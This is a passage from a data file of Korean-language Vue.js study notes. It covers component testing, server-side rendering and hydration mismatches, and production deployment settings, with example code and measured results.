            body: "(1) 단위입니다. 반응성 API(ref·watch·customRef)만 쓰면 컨텍스트 없이 직접 호출합니다. const v = ref(''); const d = useDebounce(v, 100); v.value = 'a'; v.value = 'ab'; await vi.advanceTimersByTimeAsync(100); expect(d.value).toBe('ab'). 실제로 돌려 보면 customRef 디바운스가 연속 쓰기에 한 번만 반응했습니다. 안에서 onUnmounted를 쓴다면 withSetup으로 감싸 app.unmount()까지 검증합니다. (2) 컴포넌트 테스트입니다. const w = mount(ProductCard, { props: { product: { id: 7, … } } }); await w.find('button.add').trigger('click'); expect(w.emitted('add-to-cart')).toEqual([[7]]). 내부 메서드나 state는 보지 않고 emitted만 확인합니다. 자식(가격 포맷 컴포넌트 등)은 실제로 렌더되게 둡니다. (3) E2E입니다. Playwright로 운영 빌드를 띄워 실제 브라우저에서 네 페이지를 거치며 각 단계의 보이는 결과(합계, 주소 검증 메시지, 완료 번호)를 확인합니다. 결제 API는 테스트 모드나 모킹 서버로. 각 페이지의 세부 동작은 컴포넌트 테스트로 내려 E2E는 흐름만 얇게 둡니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Testing", href: `${DOCS}/guide/scaling-up/testing` },
      { label: "Vue Test Utils", href: "https://test-utils.vuejs.org/" },
      { label: "Vitest", href: "https://vitest.dev/" },
    ],
  },

  {
    id: "vg-scale-ssr",
    name: "서버 사이드 렌더링",
    tagline: "같은 컴포넌트를 서버에서 HTML 로, 브라우저에서 하이드레이션으로 — 서버에는 DOM·추적·요청 격리가 없다",
    intro:
      "확장하기 마지막 페이지입니다. SSR은 서버에서 컴포넌트를 HTML 문자열로 렌더해 보내고, 브라우저가 그 HTML에 Vue를 붙여(하이드레이션) 상호작용하게 만드는 것입니다. 이점: 콘텐츠까지의 시간, 통합 멘탈 모델, SEO. 비용: 개발 제약(브라우저 전용 코드는 특정 훅에만), Node 서버, 서버 부하. 데이터가 빌드 때 정해지면 SSG. 기본: createSSRApp + renderToString(vue/server-renderer), 클라이언트는 같은 createSSRApp(…).mount('#app'). 문서는 Nuxt·Quasar·Vite SSR 같은 상위 해법을 '강력히 권장'. SSR 친화 코드: 서버에서는 반응성 비활성, 'beforeCreate·created만 호출'(setup 포함, onServerPrefetch), 브라우저 전용 API는 onMounted에서, 모듈 수준 상태는 요청 간 오염, 하이드레이션 불일치(잘못된 중첩, 난수, 시간대)와 3.5+ data-allow-mismatch, 커스텀 디렉티브는 getSSRProps, Teleport는 ctx.teleports. 실제로 돌려 보면 서버 watchEffect는 초기 1회(추적 꺼짐), 돈 훅은 serverPrefetch만, 모듈 reactive는 shared=1 → 2, 불일치는 '[Vue warn]: Hydration text content mismatch on …'와 'Hydration completed but contains mismatches.'이고 클라이언트 값으로 고쳐졌으며, data-allow-mismatch=\"text\" 요소는 경고 없음, Suspense·Teleport·useId·provide가 서버에서 동작했습니다. 이 노드의 질문은 하나입니다. 서버와 브라우저에서 같은 코드가 어떻게 다르게 도나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "SSR이란: 서버에서 Vue 컴포넌트를 HTML로 렌더해 응답. 클라이언트가 받아 '하이드레이션'(기존 HTML에 이벤트·상태를 붙여 상호작용 가능하게). 왜: 더 빠른 콘텐츠 표시(LCP), 같은 언어·모델, SEO. 트레이드오프: 개발 제약(브라우저 API는 특정 훅에만, 외부 라이브러리 호환), 빌드·배포 요구(Node 서버), 서버 CPU 부하. SSG(사전 렌더링): 데이터가 빌드 때 정해지면 빌드 때 HTML 생성(마케팅·문서는 SSG 권장. VitePress). 기본 튜토리얼: // app.js export function createApp() { return createSSRApp({ data: () => ({ count: 1 }), template: '<button @click=\"count++\">{{ count }}</button>' }) } // server.js const app = createApp(); const html = await renderToString(app); res.send(`<html><body><div id=\"app\">${html}</div><script type=\"module\" src=\"/client.js\"></script></body></html>`) // client.js createApp().mount('#app'). 상위 해법: 'Nuxt, Quasar, Vite SSR을 강력히 권장'(번들 두 벌, 라우팅·데이터·수화 처리). SSR 친화 코드: '서버에서는 반응성이 꺼져 있음'. 생명주기 '서버에서 호출되는 훅은 beforeCreate와 created만'(Composition은 setup과 onServerPrefetch). 타이머 등 부수 효과는 onMounted로. 플랫폼 API(window·document)는 onMounted에서. 요청 간 상태 오염: 모듈 싱글턴 금지, 요청마다 앱·스토어 생성 후 provide. 하이드레이션 불일치: 잘못된 HTML 중첩(<p> 안 <div>), 난수, 시간대. 처방 v-if + onMounted(클라이언트 전용), 시드 난수, 3.5+ data-allow-mismatch. 커스텀 디렉티브: getSSRProps로 서버 속성. Teleport: ctx.teleports.",
        code: "// app.js — 서버·클라이언트 공용 (요청마다 새 앱)\nimport { createSSRApp } from 'vue'\nexport function createApp() { return createSSRApp(App) }\n\n// server.js\nimport { renderToString } from 'vue/server-renderer'\nserver.get('*', async (req, res) => {\n  const app = createApp()                              // 요청마다\n  const ctx = {}\n  const html = await renderToString(app, ctx)          // ctx.teleports 도 여기\n  res.send(`<!DOCTYPE html><html><body><div id=\"app\">${html}</div><script type=\"module\" src=\"/client.js\"></script></body></html>`)\n})\n\n// client.js — 하이드레이션\ncreateApp().mount('#app')\n\n// SSR 친화\nonMounted(() => { window.addEventListener(…); timer = setInterval(…) })   // 브라우저 전용은 여기\n<span data-allow-mismatch=\"text\">{{ new Date().toLocaleString() }}</span>   // 3.5+ 불가피한 불일치\n<ClientOnly v-if=\"mounted\">…</ClientOnly>                                   // v-if + onMounted 로 클라이언트 전용",
        terms: [
          {
            term: "하이드레이션 (hydration)과 불일치",
            body: "서버가 보낸 HTML을 클라이언트의 Vue가 '내가 렌더했으면 이렇게 됐을 것'과 비교하면서 기존 DOM 노드에 이벤트와 상태를 붙이는 일입니다. 다시 그리지 않아 빠릅니다. 서버 렌더 결과와 클라이언트 첫 렌더가 다르면 불일치이고, 개발 모드는 'Hydration text content mismatch' 같은 경고를 내며 클라이언트 쪽으로 고칩니다(실제로 확인). 원인은 보통 환경 차이(시간대, 난수, window 분기, 브라우저가 고친 잘못된 HTML 중첩)입니다. 렌더링 노드 12장의 하이드레이션이 이 자리입니다.",
          },
          {
            term: "onServerPrefetch",
            body: "서버 렌더 때만 불리는 훅으로, 돌려준 Promise가 끝날 때까지 서버 렌더러가 기다립니다. 데이터를 받아 상태에 넣어야 서버 HTML에 데이터가 들어갑니다. 클라이언트에서는 불리지 않으므로 받은 데이터를 직렬화해 넘겨 하이드레이션 때 같은 상태가 되게 합니다. 실제로 돌려 보면 서버에서 돈 훅은 이것만이었고 beforeMount·mounted는 돌지 않았습니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node의 @vue/server-renderer 3.5.45로 createSSRApp을 renderToString했습니다. 자식에 onBeforeMount·onMounted·onServerPrefetch, 부모에 onMounted를 걸었을 때 돈 훅은 ['child serverPrefetch']만. serverPrefetch의 10ms 대기를 렌더러가 기다렸습니다. 서버에서 ref에 watchEffect를 걸고 setup 안에서 값을 바꾸니 효과는 초기 1회만(runs 1). 추적이 꺼져 있습니다. 모듈 수준 reactive를 setup에서 ++하는 앱을 요청마다 새로 만들어 두 번 렌더하니 shared=1 → shared=2(누적), setup 로컬 ref는 매번 1. useSSRContext()로 ctx.title을 적으니 호출 쪽 ctx에서 읽혔습니다. provide/inject가 서버에서 동작했고(주입됨), Suspense 안 async setup을 기다려 <b>비동기 도착</b>을 냈고, Teleport는 본문에 <!--teleport start--><!--teleport end-->만 남기고 ctx.teleports['#modal']에 내용을 모았습니다. useId는 'v-0'. template 문자열 컴포넌트도 렌더됐습니다(서버 빌드에 컴파일러). renderToWebStream은 작은 트리를 한 청크로 냈습니다. Chrome에서 서버 HTML(<p>서버 글자</p><span data-allow-mismatch=\"text\">서버</span><i id=\"hid\"></i>)에 다른 템플릿(<p>클라 글자</p>…<i>{{ id }}</i>)으로 createSSRApp(…).mount하니 경고 '[Vue warn]: Hydration text content mismatch on …' 둘(p와 i), console.error 'Hydration completed but contains mismatches.', DOM은 클라이언트 값으로 고쳐졌고, data-allow-mismatch=\"text\"를 둔 span은 경고가 없었습니다.",
        code: "// Node 24 · @vue/server-renderer 3.5.45\n돈 훅: ['child serverPrefetch']           (beforeMount · mounted ✗ · serverPrefetch 의 await 는 기다림)\n서버 watchEffect: runs 1                  (추적 꺼짐)\n모듈 reactive: 요청 1 shared=1 · 요청 2 shared=2   (오염) · setup 로컬 ref 는 매번 1\nuseSSRContext(): ctx.title = '제목' ✓ · provide/inject ✓ · Suspense 기다림 ✓ · Teleport → ctx.teleports · useId 'v-0' · template 문자열 컴파일 ✓\n\n// Chrome 156 — 하이드레이션 불일치\n서버 <p>서버 글자</p> vs 클라 <p>클라 글자</p>\n→ [Vue warn]: Hydration text content mismatch on … (×2)\n→ console.error: Hydration completed but contains mismatches.\n→ DOM: 클라이언트 값으로 고쳐짐\n<span data-allow-mismatch=\"text\">  → 경고 없음",
      },
      {
        label: "문제: 서버 렌더 뒤 상호작용이 되기까지 깜빡이고 콘솔에 불일치 경고가 쏟아진다",
        body: "서버 HTML에는 '2026. 11. 12. 오후 3:00'(서버 시간대·로케일)이, 클라이언트 첫 렌더에는 사용자 시간대의 다른 문자열이 들어가 'Hydration text content mismatch'가 나고 그 자리가 다시 그려집니다. 또 <p> 안에 <div>를 넣은 컴포넌트는 브라우저 파서가 구조를 고쳐 서버 문자열과 DOM이 달라 불일치입니다. 실제로 돌려 보면 텍스트 불일치는 경고 뒤 클라이언트 값으로 고쳐졌습니다. 처방은 원인별입니다. 시간대·로케일 의존 문자열은 클라이언트에서만(v-if=\"mounted\" + onMounted) 그리거나 서버가 사용자 시간대를 알게 하거나, 불가피하면 3.5+ data-allow-mismatch=\"text\"로 그 요소만 허용(실제로 경고 없음). 잘못된 중첩은 HTML을 고칩니다. 난수는 시드를 서버에서 내려 같게. 불일치는 '경고일 뿐 동작은 한다'가 아니라 그 트리를 다시 그리는 비용과 깜빡임이라, 운영에서는 __VUE_PROD_HYDRATION_MISMATCH_DETAILS__(3.4+) 플래그 없이는 원인도 안 보입니다.",
      },
      {
        label: "문제가 나는 경우: 서버에 없는 것을 쓸 때",
        body: "경우 ㄱ, 환경 의존 출력(시간대·로케일·난수)입니다. 위의 사고입니다. 경우 ㄴ, setup에서 window·document·localStorage. 서버 ReferenceError. onMounted. 경우 ㄷ, setup에서 setInterval. 서버에서 영원히 돔(unmounted 안 불림). onMounted/onUnmounted. 경우 ㄹ, 서버에서 watch로 파생·데이터 로딩 기대. 추적 꺼짐(실제로 runs 1). onServerPrefetch·동기 계산. 경우 ㅁ, 모듈 수준 스토어. 요청 간 오염(실제로). 요청마다 생성·provide. 경우 ㅂ, 잘못된 HTML 중첩. 파서가 고쳐 불일치. 유효한 HTML. 경우 ㅅ, 서버 데이터를 클라이언트에 안 넘김. 클라이언트가 빈 상태로 렌더해 불일치. 직렬화. 경우 ㅇ, body를 Teleport 타깃으로. 불일치. 전용 컨테이너. 경우 ㅈ, 커스텀 디렉티브의 mounted로 서버 속성 기대. 안 돎. getSSRProps. 경우 ㅊ, createApp으로 서버 HTML에 마운트. 지우고 다시 그림. createSSRApp. 경우 ㅋ, 운영 불일치 원인 불명. 플래그 __VUE_PROD_HYDRATION_MISMATCH_DETAILS__. 경우 ㅌ, data-allow-mismatch를 전부에. 진짜 불일치도 숨김. 불가피한 요소에만. 경우 ㅍ, 직접 SSR 구축. 번들 두 벌·라우팅·데이터·수화 처리 부담. Nuxt 등.",
        code: "경우               언제 생기나                       겉모습                                           처방\nㄱ 환경 의존 출력     Date · random · 로케일              Hydration text content mismatch (실제로) · 깜빡      클라이언트 전용 · 시드 · data-allow-mismatch\nㄴ 브라우저 API      setup 에서 window                   ReferenceError (서버)                            onMounted\nㄷ 서버 타이머        setup setInterval                   영원히 (unmounted 없음)                            onMounted/onUnmounted\nㄹ 서버 watch       파생·로딩 기대                       안 돎 (실제로 runs 1)                             onServerPrefetch\nㅁ 모듈 스토어       reactive 모듈                        요청 간 오염 (실제로 1→2)                          요청마다 · provide · Pinia\nㅂ 잘못된 중첩       <p><div>                            파서가 고침 → 불일치                              유효 HTML\nㅅ 상태 미전달       서버 데이터만                        클라이언트 빈 상태 → 불일치                         직렬화 · 복원\nㅇ body Teleport    to=\"body\"                          불일치                                         전용 컨테이너\nㅈ 디렉티브 mounted   서버 속성 기대                       안 돎                                          getSSRProps\nㅊ createApp 마운트   서버 HTML 에                        다시 그림                                       createSSRApp\nㅋ 운영 원인 불명     production 불일치                    상세 없음                                       3.4+ 플래그\nㅌ 전부 allow       data-allow-mismatch 남발             진짜 버그 숨김                                   최소\nㅍ 직접 구축        서버 설정 손수                        부담                                           Nuxt · Quasar · Vite SSR",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 같은 코드가 두 환경에서 돌되, 서버에는 셋이 없다 — DOM, 추적, 사용자 격리",
        body: "SSR의 모든 함정은 '서버에 없는 것'으로 모입니다. DOM이 없으니 window·document·마운트 훅·디렉티브 DOM 훅이 없고(ㄴ, ㄷ, ㅈ, 실제로 serverPrefetch만), 추적이 없으니 watch·computed 갱신이 없고 한 번의 동기 렌더만 있으며(ㄹ), 사용자 격리가 없으니 모듈 수준은 모두가 공유합니다(ㅁ). 그리고 서버의 출력(HTML)과 브라우저의 첫 렌더가 같아야 하이드레이션이 맞으니, 두 환경에서 다른 값(ㄱ, ㅅ)과 파서가 고치는 HTML(ㅂ, ㅇ)이 불일치가 됩니다. 처방은 코드를 '양쪽 공통(setup의 동기 계산, 템플릿) / 서버 전용(onServerPrefetch, getSSRProps, 요청마다 생성) / 브라우저 전용(onMounted 이후)'으로 가르고, 불일치는 원인을 고치되 불가피한 것만 data-allow-mismatch로 표시하는 것입니다. 그 가름을 프레임워크(Nuxt)가 대신해 주니 문서가 강력히 권합니다(ㅍ).",
        code: "서버 (요청마다 1회 동기 렌더 → HTML)                  브라우저 (하이드레이션 → 계속 갱신)\n  없음: DOM (ㄴ ㄷ ㅈ) · 추적 (ㄹ) · 사용자 격리 (ㅁ)        있음: 전부\n  돈 것: setup · onServerPrefetch · provide · Suspense     돈 것: setup → beforeMount → mounted …\n       ─────────── HTML 이 같아야 함 (하이드레이션) ───────────\n       다른 값 (ㄱ ㅅ) · 파서가 고친 HTML (ㅂ ㅇ) → 불일치 → 경고 + 다시 그림\n\n가르기: 공통 (setup 동기 · 템플릿) / 서버 전용 (onServerPrefetch · getSSRProps · 요청마다) / 브라우저 전용 (onMounted 이후)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "확장하기가 끝났습니다. 다음 장 '베스트 프랙티스'는 운영 배포, 성능, 접근성, 보안 네 페이지입니다. 실제로 돌려 보면 새 객체를 돌려주는 computed가 안정성을 깨 효과를 매번 깨웠고, 브라우저 개발 빌드와 운영 빌드의 크기 차이를 확인했습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 상품 상세 SSR 페이지에서 '최근 본 상품'은 localStorage에 있습니다. 어떻게 그릴까요? (2) 가격을 사용자 통화로 포맷해 보이는데 서버는 통화를 모릅니다. 선택지는? (3) 요청마다 다른 사용자인데 Pinia 없이 스토어를 쓰려 합니다. 최소 구조는?",
        notes: [
          {
            title: "답",
            body: "(1) 서버에는 localStorage가 없고 setup에서 읽으면 ReferenceError입니다. 서버 HTML에는 자리만(또는 아무것도) 두고, const recent = ref([]); onMounted(() => { recent.value = JSON.parse(localStorage.getItem('recent') ?? '[]') })로 브라우저에서 채웁니다. 서버와 클라이언트 첫 렌더가 둘 다 빈 목록이라 불일치가 없고, mounted 뒤 갱신으로 채워집니다(실제로 서버에서는 mounted가 돌지 않음). (2) 셋 중 하나입니다. 통화를 쿠키나 Accept-Language로 서버가 알게 해 서버·클라이언트가 같은 값을 그리거나(i18n 노드 12단계의 처방), 가격 포맷을 클라이언트 전용으로 미뤄 서버는 숫자만 내고 onMounted 뒤 포맷하거나, 불가피하게 다르면 그 요소에 data-allow-mismatch=\"text\"(3.5+)를 두어 경고 없이 클라이언트 값으로 고치게 합니다(실제로 경고 없음). (3) 모듈 수준 reactive는 요청 간에 샙니다(실제로 shared 누적). export function createStore() { return reactive({ user: null, … }) }를 두고, 서버 핸들러에서 요청마다 const app = createSSRApp(App); const store = createStore(); app.provide(StoreKey, store); 렌더 뒤 store를 JSON으로 HTML에 심고, 클라이언트는 같은 createStore()에 그 JSON을 복원해 provide한 뒤 mount합니다. 컴포넌트는 inject(StoreKey)로만 접근합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Server-Side Rendering (SSR)", href: `${DOCS}/guide/scaling-up/ssr` },
      { label: "Server-Side Rendering API", href: `${DOCS}/api/ssr` },
      { label: "Nuxt", href: "https://nuxt.com/" },
    ],
  },

  {
    id: "vg-practices",
    name: "베스트 프랙티스",
    tagline: "운영에 올릴 때 챙길 넷: 배포, 성능, 접근성, 보안",
    intro:
      "가이드의 일곱째 장, 네 페이지입니다. 프로덕션 배포(개발 빌드와 운영 빌드의 차이, 빌드 도구 설정, 런타임 에러 추적), 성능(페이지 로드 vs 갱신 성능, 번들·코드 분할, props 안정성·v-once·v-memo·computed 안정성, 가상화·shallowRef), 접근성(스킵 링크, 제목·랜드마크, 폼 레이블, 숨김, WCAG·WAI-ARIA), 보안(신뢰할 수 없는 템플릿 금지, 자동 이스케이프, v-html·URL·style·이벤트 핸들러 주입). 실제로 돌려 보면 브라우저 개발 빌드 575,931바이트 vs 운영 177,765바이트, 새 객체를 돌려주는 computed가 안정성을 깨 효과 3회(불리언은 2회), v-memo가 같은 값 새 객체 교체에 자식 렌더 0회, 템플릿 {{ }}가 HTML을 이스케이프, 템플릿 전역 허용 목록이 window를 막는 것을 확인했습니다.",
    blocks: [
      {
        label: "네 페이지 한눈에",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "페이지          핵심 한 줄                                                       실제로 돌려 본 것\n1 프로덕션 배포   개발 전용 코드 제거 · NODE_ENV=production · 피처 플래그 · errorHandler 로 추적    개발 576KB vs 운영 178KB · errorHandler info 'render function' 등\n2 성능          로드(SSR·분할·트리셰이킹) vs 갱신(props 안정 · v-once · v-memo · computed 안정 · shallowRef · 가상화)   새 객체 computed 효과 3회 vs 불리언 2회 · v-memo 같은 값 → 자식 렌더 0 · 하나만 바꿈 → 1\n3 접근성        스킵 링크 · 제목 순서 · 랜드마크 · label for/id · aria-* · placeholder 금지 · useId    useId 'v-0' · idPrefix 'app-0'\n4 보안          신뢰 못 하는 템플릿 금지 · {{ }} 이스케이프 · v-html/URL/style/핸들러 주입 주의        {{ '<b>' }} 이스케이프 · 템플릿 전역 허용 목록 (window undefined)",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 넷은 '사용자에게 닿는 마지막 단계' 의 네 얼굴이다",
        body: "배포는 '무엇이 번들에 들어가나'(개발 코드·플래그·에러 추적), 성능은 '얼마나 빨리 보이고 얼마나 빨리 바뀌나', 접근성은 '누구에게나 보이나', 보안은 '남의 입력이 코드가 되지 않나'. 자식 넷이 각각입니다.",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 '프로덕션 배포'부터입니다.",
      },
    ],
    sources: [
      { label: "Production Deployment", href: `${DOCS}/guide/best-practices/production-deployment` },
      { label: "Security", href: `${DOCS}/guide/best-practices/security` },
    ],
  },

  {
    id: "vg-bp-deploy",
    name: "프로덕션 배포",
    tagline: "개발 전용 코드를 빼고(NODE_ENV=production), 에러는 errorHandler 로 모은다",
    intro:
      "베스트 프랙티스 첫 페이지입니다. 개발 모드는 경고·prop 검증·DevTools 지원 같은 디버깅 기능을 넣고, 운영 모드는 그것을 뺍니다. 빌드 도구 없이는 vue.global.prod.js·vue.esm-browser.prod.js를 쓰고, create-vue·Vue CLI는 자동. 직접 번들러를 설정하면 'vue'가 vue.runtime.esm-bundler.js로 풀리고, 컴파일 타임 피처 플래그(__VUE_OPTIONS_API__ 등)를 설정하고, process.env.NODE_ENV를 \"production\"으로 치환해야 합니다. 런타임 에러는 app.config.errorHandler로 모아 Sentry·Bugsnag(공식 Vue 통합)에 보냅니다. 실제로 돌려 보면 브라우저 개발 빌드는 575,931바이트, 운영 빌드는 177,765바이트였고, errorHandler의 셋째 인자 info가 'setup function', 'render function'처럼 출처를 말했으며, 운영 빌드에서 그 info는 짧은 코드가 되어 에러 참고서로 복원합니다. 이 노드의 질문은 하나입니다. 운영 번들에서 무엇이 빠지고 무엇이 남아야 하나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "개발 vs 운영: '개발 모드는 경고·prop 검증·DevTools 같은 기능을 포함하고 일부는 런타임 비용. 운영 빌드는 제거'. 빌드 없이: vue.global.prod.js(전역) 또는 vue.esm-browser.prod.js(ESM)로 바꿔 끼움. 빌드 도구: create-vue(Vite)·Vue CLI는 운영 빌드 자동. 직접 설정 시 셋. 'vue'가 vue.runtime.esm-bundler.js로 해석되게(런타임 전용), 컴파일 타임 피처 플래그 설정(고급 API 노드), process.env.NODE_ENV를 \"production\"으로 치환(개발 전용 분기 제거). 런타임 에러 추적: app.config.errorHandler = (err, instance, info) => { /* 보고 */ }. Sentry·Bugsnag가 Vue 공식 통합 제공. 운영에서 info는 짧은 코드(Production Error Code Reference). 3.5+ app.config.throwUnhandledErrorInProduction으로 운영에서도 던지게 가능.",
        code: "<!-- 빌드 없이 — .prod.js 로 교체 -->\n<script src=\"https://unpkg.com/vue@3/dist/vue.global.prod.js\"></script>\n<script type=\"module\">import { createApp } from 'https://unpkg.com/vue@3/dist/vue.esm-browser.prod.js'</script>\n\n// 직접 번들러 설정 시 셋\nresolve: { alias: { vue: 'vue/dist/vue.runtime.esm-bundler.js' } }   // 런타임 전용\ndefine: { __VUE_OPTIONS_API__: 'true', __VUE_PROD_DEVTOOLS__: 'false', __VUE_PROD_HYDRATION_MISMATCH_DETAILS__: 'false', 'process.env.NODE_ENV': '\"production\"' }\n\n// 에러 추적 — mount 전에\napp.config.errorHandler = (err, instance, info) => {\n  Sentry.captureException(err, { extra: { info, component: instance?.$options.__name } })   // info: 'render function' · 운영은 코드\n}",
        terms: [
          {
            term: "process.env.NODE_ENV 치환",
            body: "Vue 소스에는 if (process.env.NODE_ENV !== 'production') { warn(…) } 같은 분기가 있습니다. 번들러가 process.env.NODE_ENV를 문자열 \"production\"으로 바꿔 넣으면 그 분기가 상수 거짓이 되어 압축기가 경고·검증 코드를 통째로 제거합니다. Vite·Vue CLI는 자동이고, 직접 설정하면 define·DefinePlugin으로 해야 합니다. 안 하면 운영에 개발 코드가 남아 크고 느립니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "vue 3.5.45 dist의 브라우저 ESM 빌드는 개발 575,931바이트, 운영 177,765바이트(압축 전)였습니다. 개발 빌드가 낸 경고들('[Vue warn]: Invalid prop…', 'Hydration text content mismatch…', 'Extraneous non-props attributes…', 'Failed to resolve component…')과 검증 코드가 운영에서는 빠집니다. 그래서 운영에서는 잘못된 prop 타입이 조용히 지나갑니다. 개발에서 잡아야 합니다. errorHandler는 setup에서 던지면 info 'setup function', 템플릿 식 에러면 'render function'을 받았고, 중간 컴포넌트의 onErrorCaptured가 false를 돌려주면 errorHandler에 오지 않았습니다. 운영 빌드에서 info는 짧은 코드로 바뀌어(에러 참고서: 0 'setup function', 12 'ref function', sp·bc·c·bm·m·bu·u·bum·um·a·da·ec·rtc·rtg 등) 복원표가 필요합니다. 블로그의 측정은 전부 개발 빌드에서 했으므로 경고 문구는 운영에서는 보이지 않습니다.",
        code: "// vue 3.5.45 dist\nvue.esm-browser.js       575,931 B   개발 — 경고 · 검증 · 컴파일러\nvue.esm-browser.prod.js  177,765 B   운영 — 제거됨\n\n// 개발에서만 나는 것 (운영에선 조용히 지나감)\n[Vue warn]: Invalid prop: type check failed … · Missing required prop · Hydration text content mismatch · Extraneous non-props attributes · Failed to resolve component\n\n// errorHandler(err, instance, info)\n개발: info 'setup function' · 'render function' · 'native event handler' · 'watcher callback' …\n운영: info 짧은 코드 → Production Error Code Reference 로 복원\nonErrorCaptured false → errorHandler 미호출",
      },
      {
        label: "문제: 운영 번들이 개발보다 3배 크고 콘솔에 Vue 경고가 뜬다",
        body: "직접 webpack을 설정한 프로젝트의 운영 번들에 '[Vue warn]'이 보이고 크기가 큽니다. process.env.NODE_ENV가 \"production\"으로 치환되지 않아 개발 분기가 전부 남았고, 'vue'가 컴파일러 포함 빌드로 풀렸을 수 있습니다. 실제로 개발·운영 빌드 크기는 3배 넘게 차이났습니다. 처방은 문서의 셋입니다. DefinePlugin으로 'process.env.NODE_ENV': '\"production\"'과 피처 플래그, alias로 vue.runtime.esm-bundler.js, mode: 'production'. 그리고 번들 분석기로 vue 청크 크기를 확인합니다. Vite(create-vue)로 옮기면 이 셋이 기본입니다. 운영에서 경고가 안 뜨는 것은 '문제가 없다'가 아니라 '검사가 빠진 것'이므로 개발·CI에서 경고를 실패로 다룹니다.",
      },
      {
        label: "문제가 나는 경우: 개발과 운영의 차이를 모를 때",
        body: "경우 ㄱ, NODE_ENV 미치환입니다. 위의 사고입니다. 경우 ㄴ, CDN 개발 빌드를 운영에. 576KB. .prod.js. 경우 ㄷ, errorHandler 없음. 운영 에러가 콘솔에만. 모니터링 연결. 경우 ㄹ, 운영 info 코드를 못 읽음. 에러 참고서로 복원. 경우 ㅁ, 운영에서 prop 검증 경고를 기대. 제거됨. 개발·CI에서. 경우 ㅂ, 운영에 DevTools 연결이 안 됨. __VUE_PROD_DEVTOOLS__ 기본 false. 필요하면 true(비용). 경우 ㅅ, 하이드레이션 불일치 원인이 운영에서 안 보임. __VUE_PROD_HYDRATION_MISMATCH_DETAILS__(3.4+). 경우 ㅇ, Options API를 안 쓰는데 플래그 그대로. __VUE_OPTIONS_API__ false로 번들 축소(서드파티가 쓰면 깨짐). 경우 ㅈ, 소스맵 없이 배포해 스택이 난독화. 소스맵을 모니터링에 업로드. 경우 ㅊ, errorHandler에서 다시 던지지 않아 개발에서 에러가 숨음. 개발에서는 콘솔에도. 경우 ㅋ, 환경 변수를 클라이언트 번들에 노출. import.meta.env의 VITE_ 접두만. 경우 ㅌ, 운영에서 던지길 원함. throwUnhandledErrorInProduction(3.5+).",
        code: "경우               언제 생기나                       겉모습                          처방\nㄱ NODE_ENV        직접 번들러                        경고 남음 · 큼                    define '\"production\"'\nㄴ 개발 CDN        .js 그대로                         576KB                          .prod.js\nㄷ 핸들러 없음      운영 에러                          콘솔만                           errorHandler → 모니터링\nㄹ info 코드       운영                              의미 불명                         Error Code Reference\nㅁ 운영 검증 기대    type check                        제거됨                           개발·CI\nㅂ DevTools        운영 연결                          안 됨 (기본)                     __VUE_PROD_DEVTOOLS__\nㅅ 불일치 상세      운영 하이드레이션                    없음                            __VUE_PROD_HYDRATION_MISMATCH_DETAILS__\nㅇ Options 플래그    안 쓰는데 true                      번들 큼                          false (서드파티 확인)\nㅈ 소스맵          난독 스택                          추적 불가                         업로드\nㅊ 개발 숨김       핸들러만                           개발에서 안 보임                   console.error 도\nㅋ 비밀 노출       env 전부 번들에                      유출                            VITE_ 접두만\nㅌ 운영 throw      기본 로그만                         조용                            throwUnhandledErrorInProduction",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 운영 빌드는 '검사를 빼고 속도를 얻는' 거래라, 빼기 전에 검사하고 뺀 뒤에는 보고로 대신한다",
        body: "개발 빌드의 경고·검증·DevTools 훅은 전부 런타임 비용입니다. 운영은 그것을 빼서 크기와 속도를 얻습니다(ㄱ, ㄴ). 빼는 수단이 NODE_ENV 치환과 피처 플래그이고, 빼면 그만큼 '보이지 않게' 됩니다(ㅁ, ㅅ). 그래서 두 가지가 따라야 합니다. 빼기 전(개발·CI)에 경고를 전부 잡는 것과, 뺀 뒤 남는 진짜 에러를 errorHandler로 보고하는 것(ㄷ, ㄹ, ㅈ). 처방은 '개발에서는 전부 보이게, 운영에서는 전부 보고되게'이고, 플래그는 꼭 필요한 것(DevTools·불일치 상세)만 비용을 알고 켭니다(ㅂ, ㅅ, ㅇ).",
        code: "개발 빌드:  경고 · 검증 · DevTools · 컴파일러  (576KB · 느림 · 전부 보임)\n   ──NODE_ENV=production + 피처 플래그──▶\n운영 빌드:  제거  (178KB · 빠름 · 안 보임 ㅁ ㅅ)\n\n빼기 전: 개발·CI 에서 경고 = 실패   ·   뺀 뒤: errorHandler → 모니터링 (ㄷ ㄹ ㅈ)   ·   플래그는 비용 알고 (ㅂ ㅅ ㅇ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '성능'은 로드와 갱신 둘로 나눕니다. 실제로 돌려 보면 새 객체를 돌려주는 computed가 효과를 매번 깨웠고, v-memo가 같은 값의 새 객체 교체에 자식 렌더를 건너뛰었습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 운영에서 특정 컴포넌트가 가끔 빈 채로 그려지는데 콘솔은 조용합니다. 어디서부터? (2) 운영 모니터링에 info가 '12'로 옵니다. 뜻은? (3) 번들을 더 줄이려 피처 플래그를 건드리려 합니다. 무엇을 확인?",
        notes: [
          {
            title: "답",
